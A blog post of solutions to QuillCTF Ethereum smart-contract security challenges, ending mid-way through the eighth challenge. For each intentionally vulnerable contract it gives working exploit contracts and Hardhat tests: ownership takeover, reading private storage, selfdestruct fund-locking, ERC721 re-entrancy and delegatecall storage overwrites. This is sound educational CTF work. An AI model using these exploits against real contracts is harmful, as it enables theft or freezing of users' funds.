<!--
date: "2023-01-08"
tags: [ethereum, puzzles]
title: "QuillCTF"
summary: "Solutions to QuillCTF smart contract security challenges."
-->

# QuillCTF

QuillCTF is a game in which you hack Ethereum smart contracts to learn about security. It's meant to be both fun and educational. The game is designed to educate players on identifying and fixing security issues in Ethereum smart contracts. [Start solving here!](https://www.quillaudits.com/academy/ctf)

## 1. Road Closed

**Objective of CTF:**

- Become the owner of the contract.
- Change the value of hacked to `true`.

**Target contract:**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

contract RoadClosed {
  bool hacked;
  address owner;
  address pwner;
  mapping(address => bool) whitelistedMinters;

  function isContract(address addr) public view returns (bool) {
    uint size;
    assembly {
      size := extcodesize(addr)
    }
    return size > 0;
  }

  function isOwner() public view returns (bool) {
    if (msg.sender == owner) {
      return true;
    } else return false;
  }

  constructor() {
    owner = msg.sender;
  }

  function addToWhitelist(address addr) public {
    require(!isContract(addr), "Contracts are not allowed");
    whitelistedMinters[addr] = true;
  }

  function changeOwner(address addr) public {
    require(whitelistedMinters[addr], "You are not whitelisted");
    require(msg.sender == addr, "address must be msg.sender");
    require(addr != address(0), "Zero address");
    owner = addr;
  }

  function pwn(address addr) external payable {
    require(!isContract(msg.sender), "Contracts are not allowed");
    require(msg.sender == addr, "address must be msg.sender");
    require(msg.sender == owner, "Must be owner");
    hacked = true;
  }

  function pwn() external payable {
    require(msg.sender == pwner);
    hacked = true;
  }

  function isHacked() public view returns (bool) {
    return hacked;
  }
}
```

### The Attack

We can immediately see that non-contract accounts can whitelist themselves via the `addToWhitelist` function. A whitelisted account can become the owner simply by calling the `changeOwner` function. Once an account becomes the owner, all that is left to do is call the `pwn` function, and the contract will have `hacked = true`. In short:

1. `addToWhitelist(yourAddress)`
2. `changeOwner(yourAddress)`
3. `pwn(yourAddress)`

As an extra note, you can do this hack with a contract if you execute everything within the constructor, because `extcodesize` of a contract at it's constructor phase will return 0.

### Proof of Concept

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("QuillCTF 1: Road Closed", () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: RoadClosed;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("RoadClosed", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should hijack ownership", async () => {
    expect(await contract.isOwner()).to.be.true;

    // whitelist yourself
    await contract.connect(attacker).addToWhitelist(attacker.address);

    // change owner
    await contract.connect(attacker).changeOwner(attacker.address);

    // pwn
    await contract.connect(attacker)["pwn(address)"](attacker.address);
  });

  after(async () => {
    // contract should be hacked & you should be the owner
    expect(await contract.isHacked()).to.be.true;
    expect(await contract.isOwner()).to.be.true;
  });
});
```

## 2. Confidential Hash

**Objective of CTF:**

- Find the keccak256 hash of `aliceHash` and `bobHash`.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract ConfidentialHash {
  string public firstUser = "ALICE";
  uint public alice_age = 24;
  bytes32 private ALICE_PRIVATE_KEY; // Super Secret Key
  bytes32 public ALICE_DATA = "QWxpY2UK";
  bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);

  string public secondUser = "BOB";
  uint public bob_age = 21;
  bytes32 private BOB_PRIVATE_KEY; // Super Secret Key
  bytes32 public BOB_DATA = "Qm9iCg";
  bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);

  constructor() {}

  function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) {
    return keccak256(abi.encodePacked(key1, key2));
  }

  function checkthehash(bytes32 _hash) public view returns (bool) {
    require(_hash == hash(aliceHash, bobHash), "Hashes do not match.");
    return true;
  }
}
```

### The Attack

Although we might use the `private` keyword for storage variables sometimes, this does not mean they are really private. In fact, anyone can read them with no cost.

Using `ethers`, you can read the storage slots of any contract via `ethers.provider.getStorageAt(address, slot)`. The important point here would be to know how the storage layout works in Solidity.

The storage layout of a contract is greatly described in the following document: <https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html>. There is quite a lot to know there, especially related to dynamically-sized variables such as strings and byte arrays. The most important thing to know is that EVM storage slots are 32-bytes each. Variables are allocated to this storage with respect to the order they appear in the source code. Multiple variables smaller than 32-bytes combined will be put in the same slot, although that does not happen in our target contract. Larger-than-32-byte values are also a different story, but we do not have any of those neither.

So, our target contract has variables that can all fit in 32-bytes. Since they are placed in the order of appearance, the storage slot to variable mapping will be as follows:

- `0x0` has `firstUser` string, which is a string that can fit in less than 32 bytes.
- `0x1` has 256-bit Alice age.
- `0x2` has the 32-byte Alice private key.
- `0x3` has the 32-byte Alice data.
- `0x4` has the 32-byte Alice hash.
- `0x5` has `secondUser` string, which is a string that can fit in less than 32 bytes.
- `0x6` has 256-bit Bob age.
- `0x7` has the 32-byte Bob private key.
- `0x8` has the 32-byte Bob data.
- `0x9` has the 32-byte Bob hash.

We are looking for the hash values, which are at `0x4` and `0x9`. We can fetch them as follows:

```ts
// 0x4: alice hash
const aliceHash: string = await ethers.provider.getStorageAt(
  contract.address,
  ethers.utils.hexValue(4),
);

// 0x9: bob hash
const bobHash: string = await ethers.provider.getStorageAt(
  contract.address,
  ethers.utils.hexValue(9),
);
```

We will need to find the `keccak256(abi.encodePacked(aliceHash, bobHash))`, and we can do this easily in JS, thanks to `ethers`.

```ts
const hash = ethers.utils.solidityKeccak256(
  ["bytes32", "bytes32"],
  [aliceHash, bobHash],
);
```

That is all!

### Proof of Concept

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("QuillCTF 3: Confidential Hash", () => {
  let contract: ConfidentialHash;
  let owner: SignerWithAddress;

  before(async () => {
    [owner] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("ConfidentialHash", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should find the private variables", async () => {
    const aliceHash: string = await ethers.provider.getStorageAt(
      contract.address,
      ethers.utils.hexValue(4),
    );

    const bobHash: string = await ethers.provider.getStorageAt(
      contract.address,
      ethers.utils.hexValue(9),
    );

    // construct the hash as done in the contract via ethers.utils.solidityKeccak256
    const hash = ethers.utils.solidityKeccak256(
      ["bytes32", "bytes32"],
      [aliceHash, bobHash],
    );

    expect(await contract.checkthehash(hash)).to.be.true;
  });
});
```

## 3. VIP Bank

**Objective of CTF:**

- At any cost, lock the VIP user balance forever into the contract.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract VIPBank {
  address public manager;
  mapping(address => uint) public balances;
  mapping(address => bool) public VIP;
  uint public maxETH = 0.5 ether;

  constructor() {
    manager = msg.sender;
  }

  modifier onlyManager() {
    require(msg.sender == manager, "you are not manager");
    _;
  }

  modifier onlyVIP() {
    require(VIP[msg.sender] == true, "you are not our VIP customer");
    _;
  }

  function addVIP(address addr) public onlyManager {
    VIP[addr] = true;
  }

  function deposit() public payable onlyVIP {
    require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint _amount) public onlyVIP {
    require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
    require(balances[msg.sender] >= _amount, "Not enough ether");
    balances[msg.sender] -= _amount;
    (bool success, ) = payable(msg.sender).call{value: _amount}("");
    require(success, "Withdraw Failed!");
  }

  function contractBalance() public view returns (uint) {
    return address(this).balance;
  }
}
```

### The Attack

The key bug within this contract is the requirement of `address(this).balance <= maxETH` at the first line under `withdraw` function. This basically means that if at any point the contract has a balance higher than `maxETH`, no one will be able to `withdraw`.

This is a problem on it's own, but the authors have decided to limit how much one can deposit within the `deposit` function. Furthermore, only the VIP are allowed to deposit, so these people are unlikely to attack the contract in such a way.

However, there is another way to send ether to this contract: using `selfdestruct(address)`. Self-destructing a contract deletes the bytecode from the chain, and transfers all the funds within a contract to the given address.

We can bypass the `deposit` constraints by self-destructing a dummy contract with enough funds (more than `maxETH`), such that they are transferred to this victim contract. After that, no one will be able to withdraw!

### Proof of Concept

The attacker contract is as follows:

```solidity
contract VIPBankAttacker {
  constructor(address payable targetAddr) payable {
    require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");

    // self destruct to forcefully send ether to target
    selfdestruct(targetAddr);
  }
}
```

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("QuillCTF 2: VIP Bank", () => {
  let contract: VIPBank;
  let attackerContract: VIPBankAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("VIPBank", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should add VIP & deposit some funds", async () => {
    await contract.addVIP(owner.address);
    await contract.deposit({ value: parseEther("0.025") });
  });

  it("should lock funds", async () => {
    attackerContract = await ethers
      .getContractFactory("VIPBankAttacker", attacker)
      .then((f) => f.deploy(contract.address, { value: parseEther("0.51") }));
    await attackerContract.deployed();

    await expect(contract.withdraw(parseEther("0.001"))).to.be.revertedWith(
      "Cannot withdraw more than 0.5 ETH per transaction",
    );
  });
});
```

## 4. Safe NFT

**Objective of CTF:**

- Claim multiple NFTs for the price of one.

**Target contract:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract SafeNFT is ERC721Enumerable {
  uint256 price;
  mapping(address => bool) public canClaim;

  constructor(string memory tokenName, string memory tokenSymbol, uint256 _price) ERC721(tokenName, tokenSymbol) {
    price = _price; // e.g. price = 0.01 ETH
  }

  function buyNFT() external payable {
    require(price == msg.value, "INVALID_VALUE");
    canClaim[msg.sender] = true;
  }

  function claim() external {
    require(canClaim[msg.sender], "CANT_MINT");
    _safeMint(msg.sender, totalSupply());
    canClaim[msg.sender] = false;
  }
}
```

### The Attack

This contract has the good ol' re-entrancy exploit. The contract is rather innocent-looking, and the re-entrancy comes from a detail of ERC721 standard: the `onERC721Received` function.

First, what is re-entrancy? Re-entrancy is when a contract is executing a function, and before the effects of that function can take place, one can enter there again to re-execute the same function without suffering from the effects. For example, you could have a function that sends you money first, and marks the storage value `sent=true` next; you can keep recieving money by re-entering the function before `sent=true` takes place!

A similar pattern can be observed in this target contract, where `canClaim[msg.sender] = false` takes place after we actually receive our token. If this were to take place before we receive our token, re-entering the function would not work because of the `require(canClaim[msg.sender], "CANT_MINT")` requirement.

So how do we re-enter to `claim` function? That is where `onERC721Received` comes in: this function is executed if the contract supports `IERC721Receiver` interface and implements this function. Within this function, we can call `claim` again, and successfully re-enter!

We will write an attacker contract that implements `IERC721Receiver`, and write the re-enterancy logic within `onERC721Received`. We will not only re-enter, but also forward the claimed tokens to ourselves (the owner of the contract). This way, we pay the price of a single NFT but claim as many as we would like.

### Proof of Concept

The attacker contract is as follows:

```solidity
contract SafeNFTAttacker is IERC721Receiver {
  uint private claimed;
  uint private count;
  address private owner;
  SafeNFT private target;

  constructor(uint count_, address targetAddr_) {
    target = SafeNFT(targetAddr_);
    count = count_;
    owner = msg.sender;
  }

  // initiate the pwnage by purchasing a single NFT
  // we will re-enter later via onERC721Received
  function pwn() external payable {
    target.buyNFT{value: msg.value}();
    target.claim();
  }

  function claimNext() internal {
    // keep record of the current claim
    claimed++;
    // if we want to keep on claiming, continue re-entering
    // stop if you think they've had enough :)
    if (claimed != count) {
      target.claim();
    }
  }

  function onERC721Received(
    address /*operator*/,
    address /*from*/,
    uint256 tokenId,
    bytes calldata /*data*/
  ) external override returns (bytes4) {
    // forward the claimed NFT to yourself
    target.transferFrom(address(this), owner, tokenId);

    // re-enter
    claimNext();

    return IERC721Receiver.onERC721Received.selector;
  }
}
```

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("QuillCTF 4: Safe NFT", () => {
  let contract: SafeNFT;
  let attackerContract: SafeNFTAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  const price = parseEther("0.1");
  const count = 3; // as many as you want

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("SafeNFT", owner)
      .then((f) => f.deploy("Safe NFT", "SFNFT", price));
    await contract.deployed();
  });

  it("should claim multiple nfts", async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory("SafeNFTAttacker", attacker)
      .then((f) => f.deploy(count, contract.address));
    await attackerContract.deployed();

    // initiate first claim and consequent re-entries via pwn
    attackerContract.pwn({ value: price });

    // you should have your requested balance :)
    expect(await contract.balanceOf(attacker.address)).to.eq(count);
  });
});
```

## 5. D31eg4t3

> This CTF challenge is developed to showcase the vulnerability which can be introduced by using delegatecall() incorrectly.
>
> "Handle with care, It's D31eg4t3"

**Objective of CTF:**

- Become the owner of the contract.
- Make `canYouHackMe` mapping to `true` for your own address.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3 {
  uint a = 12345;
  uint8 b = 32;
  string private d; // Super Secret data.
  uint32 private c; // Super Secret data.
  string private mot; // Super Secret data.
  address public owner;
  mapping(address => bool) public canYouHackMe;

  modifier onlyOwner() {
    require(false, "Not a Owner");
    _;
  }

  constructor() {
    owner = msg.sender;
  }

  function hackMe(bytes calldata bites) public returns (bool, bytes memory) {
    (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
    return (r, msge);
  }

  function hacked() public onlyOwner {
    canYouHackMe[msg.sender] = true;
  }
}
```

### The Attack

In this challenge, we are given a free-pass to make a `delegatecall` via the `hackMe` function. That is awesome, because `delegatecall` allows you to run code in the context of the caller contract. A side-effect of this is that the called contract can write to whatever storage slot they want with this. In this case, it looks like we are tasked with becoming the owner, and then calling the `hacked` function.

Let us first check the storage layout too see where `owner` would be. If all variables are less than 32 bytes in size, we should see it in the 6th slot (`0x05`). We can not always assume that to be the case, especially when there are strings. So let us just make some calls to the contract with `ethers.getStorageAt`. We find that:

```c
Slot 0 : 0x0000000000000000000000000000000000000000000000000000000000003039 // uint a
Slot 1 : 0x0000000000000000000000000000000000000000000000000000000000000020 // uint8 b
Slot 2 : 0x533020434c305333205933542053302046345200000000000000000000000026 // string d
Slot 3 : 0x0000000000000000000000000000000000000000000000000000000000000539 // uint32 c
Slot 4 : 0x3100000000000000000000000000000000000000000000000000000000000002 // string mot
Slot 5 : 0x000000000000000000000000698ee928558640e35f2a33cc1e535cf2f9a139c8 // address owner
```

So we just need to overwrite the 6th slot in the contract with our address. **However**, if you go on with the attack this way, you will notice that you always get stuck at `onlyOwner` modifier! The catch is that this modifier always reverts, no matter what; it has `require(false)` in it! So, although becoming the owner is a part of the objective, it is not enough. We also need to override mapping value too. Doing that is the same, we just need to make sure that the mapping storage variable is at the correct slot, in this case it will be the slot right after the `owner`, which is `Slot 6`.

We are also given the ability to pass `calldata` to the `delegatecall` via `bites` parameter, but we don't really need it for the attack. We can just write our code within a fallback function, which will execute when we provide an empty calldata.

### Proof of Concept

The attacker contract is as follows:

```solidity
contract D31eg4t3Attacker {
  uint256 slot0;
  uint256 slot1;
  uint256 slot2;
  uint256 slot3;
  uint256 slot4;
  address owner; // owner
  mapping(address => bool) public yesICan; // canYouHackMe

  function pwn(address target) external {
    (bool success, ) = D31eg4t3(target).hackMe("");
    require(success, "failed.");
  }

  fallback() external {
    owner = tx.origin;
    yesICan[tx.origin] = true;
  }
}
```

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("QuillCTF 5: D31eg4t3", () => {
  let contract: D31eg4t3;
  let attackerContract: D31eg4t3Attacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("D31eg4t3", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should claim ownership and hack", async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory("D31eg4t3Attacker", attacker)
      .then((f) => f.deploy());
    await attackerContract.deployed();

    // initiate first claim and consequent re-entries via pwn
    await attackerContract.connect(attacker).pwn(contract.address);
    expect(await contract.owner()).to.eq(attacker.address);
    expect(await contract.canYouHackMe(attacker.address)).to.be.true;
  });
});
```

## 6. Collatz Puzzle

**Objective of CTF:**

- Make a successful call to the `ctf` function.
- You should be the deployer of the contract at the given `addr` parameter!

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICollatz {
  function collatzIteration(uint256 n) external pure returns (uint256);
}

contract CollatzPuzzle is ICollatz {
  function collatzIteration(uint256 n) public pure override returns (uint256) {
    if (n % 2 == 0) {
      return n / 2;
    } else {
      return 3 * n + 1;
    }
  }

  function ctf(address addr) external view returns (bool) {
    // check code size
    uint256 size;
    assembly {
      size := extcodesize(addr)
    }
    require(size > 0 && size <= 32, "bad code size!");

    // check results to be matching
    uint p;
    uint q;
    for (uint256 n = 1; n < 200; n++) {
      // local result
      p = n;
      for (uint256 i = 0; i < 5; i++) {
        p = collatzIteration(p);
      }
      // your result
      q = n;
      for (uint256 i = 0; i < 5; i++) {
        q = ICollatz(addr).collatzIteration{gas: 100}(q);
      }
      require(p == q, "result mismatch!");
    }

    return true;
  }
}
```

### Solution

The important part here is obviously is the code size constraint. Writing a contract would incur a huge code size, so we have to dive hands-dirty into EVM level. We want to implement a function with the signature `collatzIteration(uint256)` in which a Collatz iteration takes place.

#### Runtime Code

We don't need to care about the function signature actually, we can just ignore the selector bytes, and do the process on whatever argument we get! This will save some bytes. First, let us write our runtime code that handles the Collatz iteration logic:

| Code Size | Section     | Instruction    | Stack       | Explanation                                                    |
| --------- | ----------- | -------------- | ----------- | -------------------------------------------------------------- |
| `0x02`    | `entry` ⚪  | `PUSH1 0x04`   | `0x4`       | skip 4-byte selector                                           |
| `0x03`    | `entry` ⚪  | `CALLDATALOAD` | `n`         | load argument from calldata                                    |
| `0x04`    | `entry` ⚪  | `DUP1`         | `n n`       | duplicate `n`                                                  |
| `0x06`    | `entry` ⚪  | `PUSH1 0x01`   | `0x1 n n`   | check parity by AND'ing with 1                                 |
| `0x07`    | `entry` ⚪  | `AND`          | `i n`       | get the last bit `i = 0x1 & n`                                 |
| `0x09`    | `entry` ⚪  | `PUSH1 0x13`   | `0x13 i n`  | push destination to `odd`                                      |
| `0x0A`    | `entry` ⚪  | `JUMPI`        | `n`         | conditional jump to `odd`                                      |
| `0x0C`    | `even` 🟢   | `PUSH1 0x1`    | `0x1 n`     | add `1` to shift once                                          |
| `0x0D`    | `even` 🟢   | `SHR`          | `m`         | find `n/2`, as shifting right once divides by 2. denote as `m` |
| `0x0F`    | `even` 🟢   | `PUSH1 0x17`   | `0x17 m`    | push destination to `return`                                   |
| `0x10`    | `even` 🟢   | `JUMP`         | `m`         | go to `return`                                                 |
| `0x11`    | `odd` 🔵    | `JUMPDEST`     | `n`         | destination for `odd` subroutine                               |
| `0x13`    | `odd` 🔵    | `PUSH1 0x3`    | `0x3 n`     | push 3 for multiplication                                      |
| `0x14`    | `odd` 🔵    | `MUL`          | `3n`        | find `3n`                                                      |
| `0x16`    | `odd` 🔵    | `PUSH1 0x1`    | `0x1 3n`    | push 1 for addition                                            |
| `0x17`    | `odd` 🔵    | `ADD`          | `m`         | find `3n+1`, denote as `m`                                     |
| `0x18`    | `return` ⚫ | `JUMPDEST`     | `m`         | destination for `return` subroutine                            |
| `0x1A`    | `return` ⚫ | `PUSH1 0x80`   | `0x80 m`    | push `0x80`, the first free memory slot                        |
| `0x1B`    | `return` ⚫ | `MSTORE`       | `-`         | store the result at `0x80` in memory                           |
| `0x1D`    | `return` ⚫ | `PUSH1 0x20`   | `0x20`      | to return an `uint256`, we need 32 bytes                       |
| `0x1F`    | `return` ⚫ | `PUSH1 0x80`   | `0x80 0x20` | position to return the data in memory                          |
| `0x20`    | `return` ⚫ | `RETURN`       | `-`         | returns 32 bytes from `0x80` in memory                         |

We have given section names and colors to make it more clear how the code is structured. The `entry` section simply retrieves the input argument (32-byte argument, ignoring the 4-byte function selector). Then, we do bitwise-AND operation on the input number with 1, which will return the last bit. If the last bit is 0, the number is even; 1 otherwise. The conditional jump activates when the top of the stack is non-zero, so it will only JUMP to the `odd` section if the number is odd. The `even` and `odd` sections do the `n/2` and `3n+1` operations respectively. Also note that there is an additional jump at the end `even` section, to go directly to the `return` section.

Here is the code in copy-paste-friendly format:

```c
// entry
PUSH1 0x04
CALLDATALOAD
DUP1
PUSH1 0x01
AND
PUSH1 0x10
JUMPI // ═════════════════╗
                       // ║
// even                // ║
PUSH1 0x01             // ║
SHR                    // ║
PUSH1 0x17             // ║
JUMP // ════════════╗     ║
                 // ║     ║
// odd           // ║     ║
JUMPDEST // <═══════║═════╝
PUSH1 0x3        // ║
MUL              // ║
PUSH1 0x1        // ║
ADD              // ║
                 // ║
// return        // ║
JUMPDEST // <═══════╝
PUSH1 0x80
MSTORE
PUSH1 0x20
PUSH1 0x80
RETURN
```

You can copy-paste the code above to play around with it at <https://www.evm.codes/playground>. Try calling with `0x112233440000000000000000000000000000000000000000000000000000000000000003`. This inputs means `n = 3` and the returned value will be a 32-byte value `3*3+1 = 10 = 0x000..00A`. The bytecode for this code is `0x6004358060011660105760011c6017565b6003026001015b60805260206080f3` (you can retrieve this from the playground link above) and it is exactly 32 bytes! This is just enough to match our constraint of `0 < codeSize <= 32`.

#### Initialization Code

Now we can write the initialization code, which is tasked with copying the runtime code above into the memory. It will do so via `CODECOPY` instruction, and must later return the code from memory. The instructions are as follows:

| Code Size | Section   | Instruction  | Stack            | Explanation                                   |
| --------- | --------- | ------------ | ---------------- | --------------------------------------------- |
| `0x02`    | `init` 🔴 | `PUSH1 0x20` | `0x20`           | runtime code is `32 = 0x20` bytes             |
| `0x04`    | `init` 🔴 | `PUSH1 0x0C` | `0x0C 0x20`      | runtime code starts at `12 = 0x0C`            |
| `0x06`    | `init` 🔴 | `PUSH1 0x00` | `0x00 0x0C 0x20` | runtime code should be written to slot 0      |
| `0x07`    | `init` 🔴 | `CODECOPY`   | `-`              | copy the runtime code from calldata to memory |
| `0x09`    | `init` 🔴 | `PUSH1 0x20` | `0x20`           | runtime code is `32 = 0x20` bytes             |
| `0x0b`    | `init` 🔴 | `PUSH1 0x00` | `0x00 0x20`      | runtime code is written to slot 0             |
| `0x0c`    | `init` 🔴 | `RETURN`     | `-`              | 32-bytes are returned from the memory         |

Again, in copy-paste friendly format:

```c
PUSH1 0x20 // 32 bytes
PUSH1 0x0C // position in bytecode of the runtime code
PUSH1 0x00 // write to memory position 0
CODECOPY   // copy the bytecode
PUSH1 0x20 // 32 bytes
PUSH1 0x00 // read from memory position 0
RETURN     // returns the code copied above
```

The bytecode is `0x6020600c60003960206000f3`. This will deploy the runtime code above to the chain.

#### Deployment & Testing

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("Custom: Collatz Puzzle", () => {
  let contract: CollatzPuzzle;
  let owner: SignerWithAddress;

  const initializationCode = "6020600c60003960206000f3";
  const runtimeCode =
    "6004358060011660105760011c6017565b6003026001015b60805260206080f3";

  before(async () => {
    [owner] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("CollatzPuzzle", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should call `ctf` successfully", async () => {
    // deploy your contract
    const tx = await owner.sendTransaction({
      to: undefined, // contract creation
      data: "0x" + initializationCode + runtimeCode,
    });
    const receipt = await tx.wait();

    // get address from receipt
    const addr = receipt.contractAddress;
    expect(addr).to.be.properAddress;

    // run the ctf function
    expect(await contract.ctf(addr)).to.be.true;
  });
});
```

**Fun fact**: I was the author of this puzzle!

## 7. True XOR

**Objective of CTF:**

- Make a successfull call to the `ctf` function.
- The given `target` parameter should belong to a contract deployed by you, and should use `IBoolGiver` interface.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXOR {
  function ctf(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}
```

### The Solution

The logical operation that is happening in `ctf` basically does an XOR. If the XOR of `p` and `q` is 0, the transaction will revert. Furthermore, we require the sender to be an EOA.

The question boils down to this: how can we return different values from a `view` function? We need to somehow change the state without using `view`, but how can we do that? Well, we don't have to be the ones to change the state; EVM does it literally every instruction by changing the `gasleft` result! So, if we can find the remaining gas in between the two calls to `giveBool`, we can use that to return a different result.

### Proof of Concept

Here is the attacker contract:

```solidity
contract TrueXORAttacker is IBoolGiver {
  uint t = 28543000;

  function giveBool() external view override returns (bool) {
    uint g = gasleft();
    return g < t;
  }

  function changeThreshold(uint _t) external {
    t = _t;
  }
}
```

We added an extra `changeThreshold` function to avoid deploying a new contract in case we miss the sweet spot for the `gasleft`. In my case, `28543000` was the correct amount, such that within the first call there is more gas, and within the second call there is less gas.

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```ts
describe("Custom: True XOR", () => {
  let contract: TrueXOR;
  let attackerContract: TrueXORAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory("TrueXOR", owner)
      .then((f) => f.deploy());
    await contract.deployed();
  });

  it("should call `ctf` successfully", async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory("TrueXORAttacker", attacker)
      .then((f) => f.deploy());
    await attackerContract.deployed();

    expect(await contract.connect(attacker).ctf(attackerContract.address)).to.be
      .true;
  });
});
```

### Alternative Solution

If you look into detials of loading a storage variable, you will see that the first time a storage variable is loaded, it will cost minimum 2100 gas. Later loads however will cost a lot less, around a minimum 100. So, the gas usage of a storage variable load can tell us whether a function has been called before or not.

Here is an example contract for this scenario:

```solidity
contract TrueXORAttacker2 is IBoolGiver {
  uint256 slot0 = 12345;

  function giveBool() external view override returns (bool) {
    uint gas = gasleft();
    uint tmp = slot0;
    tmp; // silence warning
    return (gas - gasleft()) >= 2000;
  }
}
```

This works fine too!

## 8. Pelusa

> You just opened your eyes and are in Mexico 1986; help Diego set the score from 1 to 2 goals for a win, and do whatever is necessary!

**Objective of CTF:**

- Score from 1 to 2 goals for a win (i.e. increment the `goals` variable).

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
  function getBallPossesion() external view returns (address);
}

contract Pelusa {
  address private immutable owner;
  address internal player;
  uint256 public goals = 1;

  constructor() {
    owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
  }

  function passTheBall() external {
    require(msg.sender.code.length == 0, "Only EOA players");
    require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

    player = msg.sender;
  }

  function isGoal() public view returns (bool) {
    // expect ball in owners posession
    return IGame(player).getBallPossesion() == owner;
  }

  function shoot() external {
    require(isGoal(), "missed");
    (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
    require(success, "missed");
    require(uint256(bytes32(data)) == 22_06_1986);
  }
}
```

### The Attack

There are several points to cover here:

- First of all, we need to implement a contract to be the `player`. This contract must have code-size 0!
- Furthermore, when the address is looked at in modulo 100, it must return 10. This means that the contract address msut be something chosen by us somehow.
- After the player is set, we can call `shoot` to make a delegate-call to our player contract. There, it will handle this call within `handOfGod()` function.
- We must access the `owner` immutable variable to give it to our contract.

We will tackle these one by one.

**Code Size 0**

The solution to having a contract with code-size 0 is to make the call during it's construction phase! Since a code that runs within `constructor` is not deployed to the chain yet, i.e. it lives in calldata rather than memory, it will have code-size 0.

**Address modulo 10**

How can we generate a contract with the desired address? Well, a naive solution could be to deploy many contracts until you have your desired address, in this case one that results in 10 in mod 100.

However, we got neither time nor gas for that. So, `CREATE2` comes into rescue! With `CREATE2`, we can deploy a contract with an additional salt to be used in address generation. Since we can give this salt whatever we like, we can choose one specific salt so that the address result in one such that it results in 10 mod 100.

Note that the probability of a randomly generated number being congruent to 10 modulo 100 is around 1/100. So our expected probability of generating a correct contract is about 100 tries.

**Hand of God**

Our contract will handle the `handOfGod` delegate call. Delegate call's operate on the context of the caller contract, while running the code at the target contract. So, we actually have access to all storage variables during `handOfGod`, and we can simply set `goals` to be 2 to win the game.

Returning `22_06_1986` is not a problem, just write `return 22_06_1986;` and you are good to go.

**Immutable Owner**

Immutable variables, introduced around compiler version 0.6, are variables that are set during the construction phase. However, the variable are not stored in storage, but instead their references within the bytecode are replaced with their computed value during deployment!

So, you can't simply read the storage to get the value of immutables, you must dive into the bytecode. This may sound like a needle-in-haystack issue, but thankfully we have a clue: `PUSH32`.

Immutable variable references are replaced with `PUSH32 <value>` within the bytecode, and there are not that many `PUSH32`'s within the code. Furthermore, in this contract the immutable value is an address, so we can expect a `PUSH32 <address>` where the address is a 32-byte value with 12-byte prepending zeros!

We can get the code via `getCode` function of ethers, and then look specifically for `PUSH32` followed by 12 bytes of zeros. Then, we will retrieve the remaining 20-bytes as the address.

```ts
const code = await ethers.provider.getCode(contract.address);
// PUSH32 (code: 7f) followed by 12 bytes of zeros
const index = code.indexOf("7f000000000000000000000000");
const pushLine = code.slice(index, index + 66); // get the line
const ownerAddress = "0x" + pushLine.slice(26); // get remaining 20 bytes
expect(ownerAddress).to.be.properAddress;
```

This works for this challenge, but you can also do this manually by opening the code at <evm.codes/playground> and CTRL+F the string above within the code. You should expect to get just a single occurence for this challenge!

### Proof of Concept

Now, we can construct our attacker contract, along with contract that will deploy it with `CREATE2`.

```solidity
